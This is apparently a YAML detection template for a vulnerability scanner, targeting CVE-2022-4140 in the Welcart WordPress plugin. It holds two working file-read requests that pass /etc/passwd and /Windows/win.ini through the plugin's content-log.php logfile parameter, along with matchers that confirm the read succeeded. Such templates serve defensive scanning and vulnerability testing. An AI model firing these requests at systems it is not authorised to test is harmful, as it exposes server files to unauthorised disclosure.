name: yaml-poc-collne-welcart_e-commerce-other-CVE-2022-4140
binding: 71f50a1e-de67-466d-bd32-a93a0b0862d3
detail:
    author: jiapeng.han
    links:
        - https://wpscan.com/vulnerability/0d649a7e-3334-48f7-abca-fff0856e12c7
    vulnerability:
        id: ca0c1224-20e1-4ff2-824f-c4a51628781b
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/etc/passwd
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    r1:
        request:
            cache: true
            method: GET
            path: /wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/Windows/win.ini
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: r0() || r1()
